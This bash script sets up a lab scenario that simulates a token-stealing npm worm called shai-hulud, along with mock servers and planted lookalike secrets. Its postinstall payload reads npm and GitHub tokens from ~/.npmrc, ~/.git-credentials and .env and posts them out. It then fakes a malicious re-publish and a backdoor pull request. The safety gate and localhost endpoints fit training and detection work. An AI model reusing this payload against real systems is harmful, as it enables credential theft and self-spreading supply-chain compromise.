#!/bin/bash
# SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori
SCENARIO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCENARIO_DIR}"
# shellcheck disable=SC1091
source "${SCENARIO_DIR}/../_shared/enable-testbench.sh"

# Scenario 6: Token-Theft and Re-Publishing Worm (Shai-Hulud)
# Malicious package `shai-hulud` is installed via npm install. Its postinstall
# script, gated by TESTBENCH_MODE=enabled, harvests npm and GitHub tokens from
# ~/.npmrc and ~/.git-credentials, exfiltrates them to localhost:3001, then uses
# the stolen npm token to "publish" an infected version of a victim-maintained
# package to a local mock registry and uses the GitHub token to open a backdoor
# pull request via a local GitHub simulator.

set -e

echo "================================================"
echo "Setting up Token-Theft / Re-Publishing Worm (06)"
echo "================================================"
echo ""

# Check prerequisites
echo "Checking prerequisites..."
echo ""

command -v node >/dev/null 2>&1 || { echo "Node.js is not installed. Please install Node.js 16+"; exit 1; }
command -v npm >/dev/null 2>&1 || { echo "npm is not installed. Please install npm"; exit 1; }

echo "Node.js version: $(node --version)"
echo "npm version: $(npm --version)"
echo ""

# Clean up previous (theatrical) scenario layout if it still exists
echo "Cleaning up old scenario layout..."
rm -rf legitimate-package compromised-package
rm -f templates/bundle.js infrastructure/mock-cdn.js infrastructure/replication-simulator.js

echo "Creating directory structure..."
mkdir -p malicious-packages/shai-hulud
mkdir -p victim-app/packages/victim-utils
mkdir -p infrastructure
mkdir -p templates
mkdir -p detection-tools
echo "Directories created"
echo ""

# ---------------------------------------------------------------------------
# Malicious package template
# ---------------------------------------------------------------------------
echo "Setting up malicious package template..."

cat > templates/shai-hulud-postinstall.js << 'EOF'
/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori
 * EDUCATIONAL EXAMPLE: Token-theft and re-publishing worm payload.
 *
 * Package name: shai-hulud
 *
 * SAFETY FEATURES:
 * - Only executes when TESTBENCH_MODE=enabled.
 * - All network traffic is sent to localhost mock servers only.
 * - No real npm or GitHub API calls are made.
 */

const fs = require('fs');
const path = require('path');
const http = require('http');
const os = require('os');

function run() {
  // Safety gate: never run the malicious path outside the testbench.
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  // npm sets INIT_CWD to the directory where `npm install` was invoked.
  // This is the real victim workspace even when the script runs from inside
  // node_modules/shai-hulud/.
  const projectRoot = process.env.INIT_CWD || process.cwd();

  const HARVESTER_URL = 'http://127.0.0.1:3001/collect';
  const REGISTRY_URL = 'http://127.0.0.1:3003/publish';
  const GITHUB_URL = 'http://127.0.0.1:3002/backdoor-pr';

  function readFileSafe(filePath) {
    try {
      if (fs.existsSync(filePath)) {
        return fs.readFileSync(filePath, 'utf8');
      }
    } catch (_) {
      // Ignore permission or read errors.
    }
    return null;
  }

  function postJson(url, payload) {
    return new Promise((resolve) => {
      const body = JSON.stringify(payload);
      const req = http.request(
        url,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body)
          }
        },
        (res) => {
          res.on('data', () => {});
          res.on('end', () => resolve(true));
        }
      );
      req.on('error', () => resolve(false));
      req.write(body);
      req.end();
    });
  }

  // 1. Harvest npm token from ~/.npmrc and the project .npmrc.
  const homeNpmrc = readFileSafe(path.join(os.homedir(), '.npmrc'));
  const projectNpmrc = readFileSafe(path.join(projectRoot, '.npmrc'));
  const npmrcSource = homeNpmrc || projectNpmrc || '';
  const npmTokenMatch = npmrcSource.match(/^_authToken=(.+)$/m) ||
    npmrcSource.match(/:_authToken=(.+)/) ||
    npmrcSource.match(/authToken=(.+)/);
  const npmToken = npmTokenMatch ? npmTokenMatch[1].trim() : null;

  // 2. Harvest GitHub token from ~/.git-credentials and the project .env.
  const homeGitCredentials = readFileSafe(path.join(os.homedir(), '.git-credentials'));
  const projectEnv = readFileSafe(path.join(projectRoot, '.env'));
  const gitCredentialsSource = homeGitCredentials || '';
  const envSource = projectEnv || '';
  const githubTokenMatch = gitCredentialsSource.match(/ghp_[A-Za-z0-9_]{30,}/) ||
    envSource.match(/GITHUB_TOKEN=(.+)/);
  const githubToken = githubTokenMatch
    ? (githubTokenMatch[0] || githubTokenMatch[1]).trim()
    : null;

  const harvestPayload = {
    scenario: '06',
    event: 'token_harvest',
    source: 'shai-hulud',
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    npmToken: npmToken ? `${npmToken.slice(0, 8)}...` : null,
    npmrcSource: homeNpmrc ? '~/.npmrc' : (projectNpmrc ? 'victim-app/.npmrc' : null),
    githubToken: githubToken ? `${githubToken.slice(0, 8)}...` : null,
    gitCredentialsSource: homeGitCredentials ? '~/.git-credentials' : null,
    envSource: projectEnv ? 'victim-app/.env' : null
  };

  // 3. Exfiltrate harvested tokens to the local credential harvester.
  postJson(HARVESTER_URL, harvestPayload).then(() => {
    // Optional: mirror the harvest to the Floci S3 track when enabled.
    try {
      const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
      uploadJson('06', 'token-harvest', harvestPayload);
    } catch (_) {}
  });

  // 4. Worm replication: use the stolen tokens to re-publish an infected
  // version of a package the victim maintains, and to open a backdoor PR.
  const victimPackagePath = path.join(projectRoot, 'packages', 'victim-utils', 'package.json');
  if (fs.existsSync(victimPackagePath)) {
    const victimPkg = JSON.parse(fs.readFileSync(victimPackagePath, 'utf8'));
    const versionParts = victimPkg.version.split('.').map((n) => parseInt(n, 10));
    versionParts[2] = (versionParts[2] || 0) + 1;
    const newVersion = versionParts.join('.');

    const infectedScripts = Object.assign({}, victimPkg.scripts || {}, {
      postinstall: 'node postinstall.js'
    });

    postJson(REGISTRY_URL, {
      scenario: '06',
      event: 'malicious_publish',
      package: victimPkg.name,
      version: newVersion,
      maintainer: victimPkg.author || 'victim-maintainer',
      tokenUsed: npmToken ? `${npmToken.slice(0, 8)}...` : null,
      injectedScript: infectedScripts.postinstall
    });

    postJson(GITHUB_URL, {
      scenario: '06',
      event: 'backdoor_pr',
      repo: victimPkg.repository && victimPkg.repository.url
        ? victimPkg.repository.url
        : `victim-org/${victimPkg.name}`,
      branch: 'feat/dependency-bump',
      files: [
        {
          path: 'package.json',
          change: 'injected postinstall script'
        }
      ],
      tokenUsed: githubToken ? `${githubToken.slice(0, 8)}...` : null
    });
  }
}

try {
  run();
} catch (_) {
  // Silent failure is typical for this style of payload.
}
EOF

cat > malicious-packages/shai-hulud/package.json << 'EOF'
{
  "name": "shai-hulud",
  "version": "1.0.0",
  "description": "A small text formatting utility [MALICIOUS - EDUCATIONAL ONLY]",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js"
  },
  "keywords": ["format", "string", "text"],
  "author": "Attacker (Educational Demo)",
  "license": "MIT"
}
EOF

cp templates/shai-hulud-postinstall.js malicious-packages/shai-hulud/postinstall.js

cat > malicious-packages/shai-hulud/index.js << 'EOF'
/**
 * shai-hulud
 * Benign-looking public API. The malicious behavior lives in postinstall.js.
 */

class ShaiHulud {
  static format(text) {
    return `[shai-hulud] ${text}`;
  }
}

module.exports = ShaiHulud;
EOF

echo "Malicious package created"
echo ""

# ---------------------------------------------------------------------------
# Victim application and a package the victim maintains
# ---------------------------------------------------------------------------
echo "Setting up victim application..."

cat > victim-app/package.json << 'EOF'
{
  "name": "victim-workspace",
  "version": "1.0.0",
  "description": "A private workspace that installs shai-hulud and maintains victim-utils",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "shai-hulud": "file:../malicious-packages/shai-hulud",
    "victim-utils": "file:./packages/victim-utils"
  },
  "author": "Victim Org",
  "license": "MIT"
}
EOF

cat > victim-app/index.js << 'EOF'
/**
 * VICTIM APPLICATION
 * Installs `shai-hulud` and depends on the internally maintained `victim-utils`.
 */

const ShaiHulud = require('shai-hulud');
const VictimUtils = require('victim-utils');

console.log('Starting victim application...');
console.log(ShaiHulud.format('dependency loaded'));
console.log(VictimUtils.greet('developer'));
console.log('If TESTBENCH_MODE is enabled, the postinstall script has already run.');
console.log('Check the credential harvester, mock registry, and GitHub simulator for evidence.');
EOF

cat > victim-app/packages/victim-utils/package.json << 'EOF'
{
  "name": "victim-utils",
  "version": "1.0.0",
  "description": "Internal utilities maintained by the victim team",
  "main": "index.js",
  "author": "Victim Org",
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "https://github.com/victim-org/victim-utils"
  }
}
EOF

cat > victim-app/packages/victim-utils/index.js << 'EOF'
/**
 * victim-utils
 * Legitimate internal package maintained by the victim team.
 */

module.exports = {
  greet(name) {
    return `Hello, ${name}!`;
  }
};
EOF

echo "Victim application created"
echo ""

# ---------------------------------------------------------------------------
# Local mock infrastructure
# ---------------------------------------------------------------------------
echo "Setting up infrastructure components..."

cat > infrastructure/credential-harvester.js << 'EOF'
/**
 * Credential Harvester Server
 * Receives and logs exfiltrated tokens from the malicious package.
 */

require('./scenario-provenance');

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3001;
const logFile = path.join(__dirname, 'captured-credentials.json');

if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk.toString();
    });

    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        console.log('\nCAPTURED TOKENS:');
        console.log(JSON.stringify(data, null, 2));
        console.log('-'.repeat(50));

        const captures = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        const captureEntry = {
          timestamp: new Date().toISOString(),
          data
        };
        captures.captures.push(captureEntry);
        fs.writeFileSync(logFile, JSON.stringify(captures, null, 2));

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Tokens received' }));

        try {
          require('../../../detection-tools/es/forward-capture')
            .forwardCaptureIfEnabled(__dirname, captureEntry)
            .catch(() => {});
        } catch (_) {}
      } catch (e) {
        console.error('Error processing tokens:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'GET' && req.url === '/captured-credentials') {
    const captures = fs.readFileSync(logFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(captures);
  } else if (req.method === 'DELETE' && req.url === '/captured-credentials') {
    fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'Captures cleared' }));
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('Credential Harvester Started');
  console.log('-'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  POST   /collect              - Receive exfiltrated tokens`);
  console.log(`  GET    /captured-credentials  - View captured tokens`);
  console.log(`  DELETE /captured-credentials  - Clear captured tokens`);
  console.log('-'.repeat(50));
  console.log('Waiting for tokens...\n');
});
EOF

cat > infrastructure/mock-registry.js << 'EOF'
/**
 * Mock npm Registry Server
 * Receives simulated malicious publish attempts from the worm payload.
 */

require('./scenario-provenance');

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3003;
const logFile = path.join(__dirname, 'published-packages.json');

if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, JSON.stringify({ publishes: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/publish') {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk.toString();
    });

    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        console.log('\nMALICIOUS PUBLISH ATTEMPT:');
        console.log(JSON.stringify(data, null, 2));
        console.log('-'.repeat(50));

        const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        const publishEntry = {
          timestamp: new Date().toISOString(),
          data
        };
        logs.publishes.push(publishEntry);
        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Publish logged (simulated)' }));

        try {
          require('../../../detection-tools/es/forward-capture')
            .forwardCaptureIfEnabled(__dirname, publishEntry)
            .catch(() => {});
        } catch (_) {}
      } catch (e) {
        console.error('Error processing publish:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'GET' && req.url === '/published-packages') {
    const logs = fs.readFileSync(logFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(logs);
  } else if (req.method === 'DELETE' && req.url === '/published-packages') {
    fs.writeFileSync(logFile, JSON.stringify({ publishes: [] }, null, 2));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'Publishes cleared' }));
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('Mock Registry Started');
  console.log('-'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  POST   /publish             - Simulate a malicious package publish`);
  console.log(`  GET    /published-packages  - View publish attempts`);
  console.log(`  DELETE /published-packages  - Clear publish attempts`);
  console.log('-'.repeat(50));
  console.log('Waiting for publishes...\n');
});
EOF

cat > infrastructure/github-actions-simulator.js << 'EOF'
/**
 * GitHub Actions Simulator
 * Simulates backdoor pull requests opened with stolen GitHub tokens.
 */

require('./scenario-provenance');

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3002;
const prLogFile = path.join(__dirname, 'backdoor-prs.json');
const repoLogFile = path.join(__dirname, 'repo-logs.json');

if (!fs.existsSync(prLogFile)) {
  fs.writeFileSync(prLogFile, JSON.stringify({ prs: [] }, null, 2));
}
if (!fs.existsSync(repoLogFile)) {
  fs.writeFileSync(repoLogFile, JSON.stringify({ repos: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/backdoor-pr') {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk.toString();
    });

    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        console.log('\nBACKDOOR PR OPENED (SIMULATED):');
        console.log(JSON.stringify(data, null, 2));
        console.log('-'.repeat(50));

        const prs = JSON.parse(fs.readFileSync(prLogFile, 'utf8'));
        const prEntry = {
          timestamp: new Date().toISOString(),
          data
        };
        prs.prs.push(prEntry);
        fs.writeFileSync(prLogFile, JSON.stringify(prs, null, 2));

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Pull request logged (simulated)' }));

        try {
          require('../../../detection-tools/es/forward-capture')
            .forwardCaptureIfEnabled(__dirname, prEntry)
            .catch(() => {});
        } catch (_) {}
      } catch (e) {
        console.error('Error processing PR:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'POST' && req.url === '/create-repo') {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk.toString();
    });

    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        console.log('\nREPOSITORY CREATION ATTEMPT:');
        console.log(`  Name: ${data.name || 'unknown'}`);
        console.log('-'.repeat(50));

        const logs = JSON.parse(fs.readFileSync(repoLogFile, 'utf8'));
        logs.repos.push({
          timestamp: new Date().toISOString(),
          name: data.name || 'unknown',
          data
        });
        fs.writeFileSync(repoLogFile, JSON.stringify(logs, null, 2));

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Repository created (simulated)' }));
      } catch (e) {
        console.error('Error processing repo creation:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'GET' && req.url === '/backdoor-prs') {
    const logs = fs.readFileSync(prLogFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(logs);
  } else if (req.method === 'DELETE' && req.url === '/backdoor-prs') {
    fs.writeFileSync(prLogFile, JSON.stringify({ prs: [] }, null, 2));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'PR logs cleared' }));
  } else if (req.method === 'GET' && req.url === '/repo-logs') {
    const logs = fs.readFileSync(repoLogFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(logs);
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('GitHub Actions Simulator Started');
  console.log('-'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  POST   /backdoor-pr  - Simulate opening a backdoor pull request`);
  console.log(`  GET    /backdoor-prs - View backdoor PR logs`);
  console.log(`  POST   /create-repo  - Simulate repository creation`);
  console.log(`  GET    /repo-logs    - View repository logs`);
  console.log('-'.repeat(50));
  console.log('Waiting for requests...\n');
});
EOF

chmod +x infrastructure/*.js
echo "Infrastructure components created"
echo ""

# ---------------------------------------------------------------------------
# Lookalike secrets
# ---------------------------------------------------------------------------
echo "Planting lookalike secrets..."

bash "${SCENARIO_DIR}/../_shared/plant-lookalike-secrets.sh" 06

# Also plant a ~/.git-credentials fixture if one does not already exist.
# In the Docker lab HOME is /root, so this is safe. On a developer machine
# we skip if the file already exists to avoid overwriting real credentials.
if [ ! -f "${HOME}/.git-credentials" ]; then
  LOOKALIKE_ENV="${SCENARIO_DIR}/../_shared/lookalike-secrets.env"
  GITHUB_TOKEN="$(grep '^export GITHUB_TOKEN=' "${LOOKALIKE_ENV}" | head -1 | sed 's/^export GITHUB_TOKEN=//')"
  cat > "${HOME}/.git-credentials" << EOF
# LAB ONLY - lookalike GitHub token for Shai-Hulud harvest demo
https://victim:${GITHUB_TOKEN}@github.com
EOF
  echo "   Planted ${HOME}/.git-credentials"
else
  echo "   Skipped ${HOME}/.git-credentials (already exists)"
fi

echo "Lookalike secrets planted"
echo ""

echo "================================================"
echo "Setup Complete"
echo "================================================"
echo ""
echo "Next steps:"
echo ""
echo "1. Start the local mock servers:"
echo "   cd infrastructure"
echo "   node credential-harvester.js &"
echo "   node github-actions-simulator.js &"
echo "   node mock-registry.js &"
echo ""
echo "2. Review the malicious package:"
echo "   cat malicious-packages/shai-hulud/postinstall.js"
echo ""
echo "3. Install the malicious package:"
echo "   cd victim-app"
echo "   export TESTBENCH_MODE=enabled"
echo "   npm install"
echo ""
echo "4. Inspect the attack evidence:"
echo "   curl http://localhost:3001/captured-credentials"
echo "   curl http://localhost:3003/published-packages"
echo "   curl http://localhost:3002/backdoor-prs"
echo ""
echo "5. Run the victim application:"
echo "   npm start"
echo ""
echo "Read the full lab instructions:"
echo "   cat README.md"
echo ""
